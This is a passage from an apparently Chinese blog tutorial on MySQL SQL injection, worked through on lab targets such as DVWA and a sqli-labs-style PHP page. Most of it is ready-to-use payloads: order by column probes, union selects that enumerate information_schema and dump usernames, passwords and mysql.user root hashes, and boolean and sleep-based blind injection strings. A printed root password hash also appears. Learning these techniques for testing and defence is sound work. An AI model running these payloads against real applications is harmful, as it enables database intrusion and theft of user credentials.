class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);<span class="comment">//把查询的结果给result这个变量</span></span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);<span class="comment">//把结果变成了数组的形式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)<span class="comment">//如果得到结果就把他展示出来↓</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="comment">//没有得到结果就展示mysql操作产生的文本错误信息</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们只要关心这一句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>把之前传入的 <code>1&#39;</code> 带入 <code>$id</code> 看看结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;&#x27; LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p>会发现传入的单引号把原本已经存在的那一个左单引号闭合掉了</p><p>那多出来的那一个右单引号就出了问题了</p><p>导致后面的语句被识别为要运行的代码</p><p>使用 and 1=1—+</p><p>mysql中的注释有两种，一个是 <code>--空格</code>，一个是 <code>#</code></p><p><a href="https://blog.csdn.net/xiayun1995/article/details/86500605">sql注入中的注释符的解释</a></p><p><code>&#39;order by 4--+</code> 猜列数</p><p>order by 是用来排序的，后面可以跟着列数，比如 order by 1 是按照第一列来排序，当使用大于数据表有的列数的时候就肯定会报错了，这样就可以用来判断有几列</p><p><code>-1&#39;union select 1,2,3--+</code> 联合查询，一般用来检查什么地方可以回显</p><p><img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1573472008439-91aa61d7-2a5e-4929-afb0-64fe8df559bd.png" alt="img"></p><p>显示出 2,3，说明这里 2 与 3 的位置会被打印出来</p><p>我们就可以把想要查询的放在这里两个位置让他显示给我们</p><h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><p>SQL 注入分类：</p><p>按 SQLMap 中的分类来看，SQL 注入类型有以下 5 种：</p><ul><li>[ ] UNION query SQL injection               （可联合查询注入）</li><li>[ ] Stacked queries SQL injection           （可多语句查询注入）堆叠查询</li><li>[ ] Boolean-based blind SQL injection       （布尔型注入）</li><li>[ ] Error-based SQL injection               （报错型注入）</li><li>[ ] Time-based blind SQL injection          （基于时间延迟注入）</li></ul><p>接受请求类型区：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.GET 注入</span><br><span class="line">GET 请求的参数是放在 URL 里的，GET 请求的 URL 传参有长度限制 中文需要 URL 编码</span><br><span class="line">2.POST注入</span><br><span class="line">POST 请求参数是放在请求 body 里的，长度没有限制</span><br><span class="line">3.COOKIE注入</span><br><span class="line">cookie 参数放在请求头信息，提交的时候 服务器会从请求头获取</span><br></pre></td></tr></table></figure><p>注入数据类型的区分：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="type">int</span>整型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br><span class="line"><span class="number">2.</span>sting字符型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"><span class="number">3.</span><span class="keyword">like</span> 搜索型</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> title <span class="keyword">like</span> <span class="string">&#x27;%标题%&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="常规利用思路"><a href="#常规利用思路" class="headerlink" title="常规利用思路"></a>常规利用思路</h3><ol><li>寻找注入点，可以通过 web 扫描工具实现</li><li>通过注入点，尝试获得关于连接数据库用户名、数据库名称、连接数据库用户权限、操作系统信息、数据库版本等相关信息。</li><li>猜解关键数据库表及其重要字段与内容（常见如存放管理员账户的表名、字段名等信息）还可以获取数据库的 root 账号 密码—思路</li><li>可以通过获得的用户信息，寻找后台登录。</li><li>利用后台或了解的进一步信息。</li></ol><h3 id="手注常规思路"><a href="#手注常规思路" class="headerlink" title="手注常规思路"></a>手注常规思路</h3><ol><li>判断是否存在注入，注入是字符型还是数字型</li><li>猜解 SQL 查询语句中的字段数 order by  N</li><li>确定显示的字段顺序</li><li>获取当前数据库</li><li>获取数据库中的表</li><li>获取表中的字段名</li><li>查询到账户的数据</li></ol><h3 id="详细注入过程"><a href="#详细注入过程" class="headerlink" title="详细注入过程"></a>详细注入过程</h3><p>SQL 注入漏洞的产生需要满足以下两个条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">参数用户可控：从前端传给后端的参数内容是用户可以控制的</span><br><span class="line"></span><br><span class="line">参数带入数据库查询：传入的参数拼接到SQL语句，且带入数据库查询</span><br><span class="line"></span><br><span class="line">如果参数id存在注入点</span><br><span class="line">参数的位置可以互换，使用工具的时候要注意</span><br></pre></td></tr></table></figure><h5 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h5><h5 id="猜列数"><a href="#猜列数" class="headerlink" title="猜列数"></a>猜列数</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by 3 --+</span><br><span class="line">&#x27; order by 4 --+</span><br><span class="line">&#x27; order by 5 --+</span><br></pre></td></tr></table></figure><h5 id="猜数据库"><a href="#猜数据库" class="headerlink" title="猜数据库"></a>猜数据库</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2 --+   查看回显点</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select user(),database(),version() --+   查看其他数据</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">union 查询结合了两个 select 查询结果</span><br><span class="line"></span><br><span class="line">根据上面的 order by 语句我们知道查询包含两列</span><br><span class="line"></span><br><span class="line">为了能够现实两列查询结果</span><br><span class="line"></span><br><span class="line">注意参数使用字段中不存在的</span><br><span class="line"></span><br><span class="line">方便全部回显</span><br><span class="line"></span><br><span class="line">-aaa&#x27; union select 1,(select ........) --+</span><br><span class="line"></span><br><span class="line">我们需要用 union 查询结合我们构造的另外一个 select</span><br><span class="line"></span><br><span class="line">注意在使用 union 查询的时候需要和主查询的列数相同</span><br><span class="line"></span><br><span class="line">information_schema.tables：记录所有表名信息的表</span><br><span class="line"></span><br><span class="line">information_schema.columns：记录所有列名信息的表</span><br><span class="line"></span><br><span class="line">table_name：表名</span><br><span class="line"></span><br><span class="line">column_name：列名</span><br><span class="line"></span><br><span class="line">table_schema：数据库名</span><br><span class="line"></span><br><span class="line">user()  查看当前MySQL登录的用户名</span><br><span class="line"></span><br><span class="line">database()   查看当前使用MySQL数据库名</span><br><span class="line"></span><br><span class="line">version()  查看当前MySQL版本</span><br></pre></td></tr></table></figure><h5 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span> database()) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>group_concat 分组查询</p><p>备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。</p><p>这里介绍几个字符连接函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line"></span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line"></span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><p>因为我们查询到的数据不是只有一个，所以需要用连接函数把他们连接成一串才能显示出来</p><h5 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name =&#x27;</span>users<span class="string">&#x27; --+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span><span class="string">&#x27;users&#x27;</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><h5 id="猜用户数据"><a href="#猜用户数据" class="headerlink" title="猜用户数据"></a>猜用户数据</h5><p>列举出几种 payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(username,password) from users --+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,(select group_concat(username,password) from users) --+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select group_concat(username),group_concat(password) from users --+</span></span><br></pre></td></tr></table></figure><h5 id="猜-root-用户"><a href="#猜-root-用户" class="headerlink" title="猜 root 用户"></a>猜 root 用户</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,group_concat(user,password) from mysql.user --+</span></span><br></pre></td></tr></table></figure><p>得到 root 用户信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><h5 id="拓展limit"><a href="#拓展limit" class="headerlink" title="拓展limit"></a>拓展limit</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit m,n 从m行开始，到m<span class="operator">+</span>n行结束</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin limit <span class="number">2</span>,<span class="number">1</span> 指的是 从第二行开始，到第三行结束</span><br></pre></td></tr></table></figure><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p><strong>根据注入位置数据类型将sql注入分类</strong></p><p><strong>利用order判断字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p><strong>利用 union select 联合查询，将id值设置成不成立，即可探测到可利用的字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">’ union select 1,2,3 --+</span><br></pre></td></tr></table></figure><p><strong>利用函数database(),user(),version()可以得到所探测数据库的数据库名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() --+</span><br></pre></td></tr></table></figure><p><strong>利用 union select 联合查询，获取表名</strong>  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure><p><strong>利用 union select 联合查询，获取字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure><p><strong>利用 union select 联合查询，获取字段值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><h5 id="union-联合注入原理"><a href="#union-联合注入原理" class="headerlink" title="union 联合注入原理"></a>union 联合注入原理</h5><p>联合查询注入是联合两个表进行注入攻击</p><p>使用关键词 union select 对两个表进行联合查询。</p><p>两个表的字段要数要相同，不然会出现报错。</p><p>member表有7个字段</p><p>users 有3个字段</p><p>如果直接联合两个表 因为列数跟第一个表不一样 会导致出错</p><p>整合的联合查询方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,4,5,6,7 from users</span><br></pre></td></tr></table></figure><p>member有个7个字段 users 也需要有三个与之匹配</p><p>这些数字可以替换成字段的名称或者函数。</p><p>替换成函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,4,database(),user(),version() from users</span><br></pre></td></tr></table></figure><p>字段替换成字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,level,id,username,password from users</span><br></pre></td></tr></table></figure><p>如果没有加上 limit 限定条数会把所有内容查询出来，所以都会加上 limit 限定</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1 union select 1,2,3,level,id,username,password from users limit 0,1</span><br></pre></td></tr></table></figure><p>但是只会显示第一条，因为 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=1</span><br></pre></td></tr></table></figure><p>这个语句是存在记录的 </p><p>如果想要 admin的内容可以把1 换成其他不存在的记录，</p><p>因为默认负数就表示不存在的</p><p>所以可以在数字前加上-1 即可显示第二个表的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM member WHERE id=-1 union select 1,2,3,level,id,username,password from users limit 1,1</span><br></pre></td></tr></table></figure><h3 id="UNION联合注入"><a href="#UNION联合注入" class="headerlink" title="UNION联合注入"></a>UNION联合注入</h3><p>源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; </span><br></pre></td></tr></table></figure><h5 id="判断-SQL-注入"><a href="#判断-SQL-注入" class="headerlink" title="判断 SQL 注入"></a>判断 <strong>SQL</strong> 注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT first_name, last_name FROM </span><br><span class="line">users WHERE user_id = &#x27;1&#x27;and &#x27;1&#x27;=&#x27;1&#x27;;&quot;; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE </span><br><span class="line">user_id = &#x27;1&#x27;and &#x27;1&#x27;=&#x27;2&#x27;;&quot;; </span><br></pre></td></tr></table></figure><p>输入1’and ‘1’=’1页面返回用户信息和输入 1’and ‘1’=’2 页面返回不一样的信息</p><p>基本可以确定存在 SQL 注入漏洞</p><h5 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h5><p>使用语句 order by 确定当前表的字符数</p><p>order by 1 如果页面返回正常 字段数不少于 1,order by 2 不少于 2，</p><p>一直如此类推直到页面出错。正确的字段数是出错数字减少 1</p><p>公式 order by n-1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1--+ 正常</span><br><span class="line"></span><br><span class="line">1&#x27; order by 2--+ 正常</span><br><span class="line"></span><br><span class="line">1&#x27; order by 3--+ 出错</span><br></pre></td></tr></table></figure><p>最终确定字段数为 2</p><h5 id="联合查询注入获取敏感信息"><a href="#联合查询注入获取敏感信息" class="headerlink" title="联合查询注入获取敏感信息"></a>联合查询注入获取敏感信息</h5><p>联合查询 输入 数字 查询页面是否有数字输出。输出的地方就是显示的内容但是被数字替换了。</p><p>-1 是让前面的表查询的内容不存在。所以就会显示显示数字。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2 --+</span><br></pre></td></tr></table></figure><p>把数据替换成 mysql 的函数例如 md5(1) 这会在页面返回 1 的 md5 加密信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,md5(1) --+</span><br></pre></td></tr></table></figure><p>使用这个函数一般是白帽子扫描器的匹配存在漏洞的特征码。</p><p>接着获取 mysql 版本 当前用户权限 当前数据库</p><p>version() mysql 版本</p><p>database() 当前数据库</p><p>user() 当前用户名</p><p>group_concat()分组打印字符串</p><p>把函数直接替换数字查看页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,version() --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(user(),0x3A,database(),version()) --+</span><br></pre></td></tr></table></figure><p>如果你想一次打印多个敏感信息可以使用 group_concat()把查询的函数写人 里 0x3A 是：这个符号的十六进制 在 mysql 里会自动转成符号：</p><p>知道当前库名是 dvwa</p><h5 id="联合查询注入通过-information-schema-获取表"><a href="#联合查询注入通过-information-schema-获取表" class="headerlink" title="联合查询注入通过 information_schema 获取表"></a>联合查询注入通过 <strong>information_schema</strong> 获取表</h5><p>在黑盒的情况下是不知道当前库有什么表的</p><p>可以通过 mysql 自带的information_schema 查询当前库的表。</p><p>查询当前库的表 limit 1 相当于 limit 1,1 表示显示第一个 1 改成 2 就是第二个</p><p>如此类推</p><p>第一个表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) --+</span><br></pre></td></tr></table></figure><p>第二个表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 1,2) --+</span><br></pre></td></tr></table></figure><h5 id="联合查询注入通过-information-schema-获取字段"><a href="#联合查询注入通过-information-schema-获取字段" class="headerlink" title="联合查询注入通过 information_schema 获取字段"></a>联合查询注入通过 <strong>information_schema</strong> 获取字段</h5><p>同样的查询字段也可以通过内置库 information_schema 里的 COLUMNS</p><p>这个表记录所有表的字段。通过 COLUMNS 查询 users 表的字段。 </p><p>获取 users 表第一个字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 1) --+</span><br></pre></td></tr></table></figure><p>获取 users 表第二个字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 2,1) --+</span><br></pre></td></tr></table></figure><p>获取 users 表第三个字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;users&#x27; limit 3,1) --+</span><br></pre></td></tr></table></figure><h5 id="通过联合查询表里的内容"><a href="#通过联合查询表里的内容" class="headerlink" title="通过联合查询表里的内容"></a>通过联合查询表里的内容</h5><p>通过以上的黑盒查询 获取库名、表名、字段、那么就可以查询某个表的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select group_concat(user,0x3a,password) from users limit 1) --+</span><br></pre></td></tr></table></figure><h3 id="布尔型盲注入"><a href="#布尔型盲注入" class="headerlink" title="布尔型盲注入"></a>布尔型盲注入</h3><p>这种在页面中不会显示数据库信息，一般情况下只会显示对与错的内容。</p><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816095058383.png" alt="image-20220816095058383" style="zoom:80%;" /></p><p>接收 id 的值，直接带入查询</p><p>如果存在即返回 users is exists in the database</p><p>否则显示 users id is missing 像这种只有正确与错误页面。</p><p>页面不会显示数据库里任何内容，如果存在注入，成为盲注入。</p><p>盲注入的方式有两种：一种是布尔型盲注入，另外一种是延时注入。</p><h5 id="判断盲注入"><a href="#判断盲注入" class="headerlink" title="判断盲注入"></a>判断盲注入</h5><p>输入 SQL 注入检测语句 判断页面是否不一样</p><p>如果不一样大概会存在 SQL 注入漏洞 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and &#x27;1&#x27;=&#x27;1 </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and &#x27;1&#x27;=&#x27;2 </span><br></pre></td></tr></table></figure><p>如果输入检测语句页面没有任何改变可以使用延时语句进行检测 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;and sleep(10)--+ </span><br></pre></td></tr></table></figure><p>函数 sleep() 在 mysql 是延时返回的意思 以秒为单位 sleep(10) 即延时 10 秒执行。</p><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816095900545.png" alt="image-20220816095900545"></p><h5 id="布尔型注入攻击"><a href="#布尔型注入攻击" class="headerlink" title="布尔型注入攻击"></a>布尔型注入攻击</h5><p>布尔型注入攻击，因为页面不会返回任何数据库内容</p><p>所以不能使用联合查询将敏感信息显示在页面</p><p>但是可以通过构造 SQL 语句，获取数据。</p><p>布尔型盲注入用到得 SQL 语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(1=1,1,0)</span><br></pre></td></tr></table></figure><p> if()函数在 mysql 是判断，第一个参数表达式，如果条件成立，会显示 1，否则显示 0</p><p>1=1 表达式可以换成构造的 SQL 攻击语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1,1,0) --+ </span><br></pre></td></tr></table></figure><p>页面返回正常</p><p>这个语句实际上是 1’and 1，真 and 真 结果为真</p><p>1 是存在记录的。所以返回正确页面。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=2,1,0) --+ </span><br></pre></td></tr></table></figure><p>页面返回错误，这个语句就是 1’and 0 ，真 and 假 结果为假</p><p>整个 SQL ID 的值也是 0 所以没有记录</p><p>返回错误页面。</p><h5 id="布尔型盲注入获取数据库敏感信息"><a href="#布尔型盲注入获取数据库敏感信息" class="headerlink" title="布尔型盲注入获取数据库敏感信息"></a>布尔型盲注入获取数据库敏感信息</h5><p>在黑盒的环境下，通过构造 SQL 注入语句，根据页面的特征确定获取敏感信息。</p><p>布尔型盲注入用到的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSTRING()字符串截取</span><br></pre></td></tr></table></figure><p>第一个参数是一个字符串，第二个参数是从哪里开始截取  第三个是要截取的长度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select database()查询当前库</span><br></pre></td></tr></table></figure><p>通过 substring 截取截取长度</p><p>举例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(‘ename’,2,2)</span><br><span class="line">结果为‘am’。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substring(database(),1,1) </span><br><span class="line">截取database（）数据库名 的第一个字符</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220816100002099.png" alt="image-20220816100002099"></p><p>接着再用 if 函数进行构造 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(substring(database(),1,1)=&#x27;r&#x27;,1,0)</span><br></pre></td></tr></table></figure><p>判断数据库第一个字是不是字符 r，如果是返回 1 否则返回 0 。</p><p>接着判断第二个字符：</p><p>将 substring 第二个参数写成 2 因为要截取第二个字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select if(sunstring(database(),2,1)=&#x27;o&#x27;,1,0) </span><br></pre></td></tr></table></figure><p>第二个字符为 o。如此类推。再后拼</p><p>接字符就是完整的库名。</p><h5 id="在黑盒模式下布尔型注入"><a href="#在黑盒模式下布尔型注入" class="headerlink" title="在黑盒模式下布尔型注入"></a>在黑盒模式下布尔型注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 